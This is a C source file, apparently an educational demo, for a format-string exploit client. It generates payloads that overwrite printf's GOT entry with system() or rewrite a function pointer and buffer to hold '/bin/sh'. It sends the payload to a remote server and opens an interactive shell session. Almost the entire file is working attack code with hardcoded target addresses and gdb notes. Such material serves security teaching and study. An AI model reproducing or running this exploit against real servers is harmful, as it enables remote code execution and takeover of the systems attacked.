/***********************************************************************
				A demo to show how to overwrite GOT entry and Function Pointer
	(1) GOT_WRITE_FMT_STR for GOT overwrite
	(2) FUNC_PTR_FMT_STR for subverting Function Pointer.
	(3) Generate a vulnerable format string to attack remote server.
	
	sheisc@163.com
************************************************************************/

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 

#include "util.h"

#define	GOT_WRITE_FMT_STR		1
#define	FUNC_PTR_FMT_STR		2

static struct server_info s_info = {
	.system_func_addr = SYSTEM_FUNC_ADDR,
	.shell_str_addr = SHELL_STR_ADDR,
	.printf_got_addr = PRINTF_GOT_ADDR,
	.stack_lifting = STACK_LIFTING_CNT,
	.printf_func_addr = PRINTF_FUNC_ADDR,	
};

static int gen_evil_fmt_str(char * pl_buf, int size,int choice){	

	// Attack vector One: to manipulate GOT entry
	if(choice == GOT_WRITE_FMT_STR){
		// Generate format string to subvert the GOT entry of printf.
		unsigned int got_addrs[] = {s_info.printf_got_addr};
		unsigned int got_vals[] = {s_info.system_func_addr };		

		gen_payload(pl_buf,size,"",got_addrs,got_vals,
						sizeof(got_addrs)/sizeof(got_addrs[0]),s_info.stack_lifting);		

	}else{// Attack vector Two: to overwrite function pointers

		// Generate format string to modify the fptr and sbuf in the server process
		// sbuf is at 0x804a080 while fptr is at 0x804a0b4.
		//	system("/bin/sh");	
		/*
		(gdb) i address sbuf
		Symbol "sbuf" is at 0x804a0a0 in a file compiled without debugging.
		(gdb) i address fptr
		Symbol "fptr" is at 0x804a0d0 in a file compiled without debugging.
		 */	
		unsigned int target_data_addr = 0x804a0a0;//0x804a080;
		unsigned int target_ptr_addr = 0x804a0d0;//0x804a0b4;
		unsigned int target_addrs[] = {target_data_addr,target_data_addr+4,target_ptr_addr};
		// 0x6E69622F,0x0068732F is ASCII code of "/bin/sh"
		unsigned int target_vals[] = {0x6E69622F,0x0068732F,s_info.system_func_addr};
		
		gen_payload(pl_buf,size,"",target_addrs,target_vals,
						sizeof(target_addrs)/sizeof(target_addrs[0]),s_info.stack_lifting);
			
	}	

	return 0;
}
void request(int sock){	
	char buf[4096];
	int n;
	
	disclose_info(sock,&s_info);	
	gen_evil_fmt_str(buf,sizeof(buf),GOT_WRITE_FMT_STR);
	strcat(buf,"\n");
	printf("%s \n",buf);
	n = in_place_escape(buf,strlen(buf));
	//Send the vulnerable format string
	send(sock, buf, n, 0);
	get_and_prt(sock,WITHOUT_OUTPUT);
	//
	REPL(sock,WITH_NORMAL_OUTPUT);
}

int main(int argc, char **argv){
	return do_it(argc,argv,request);
}

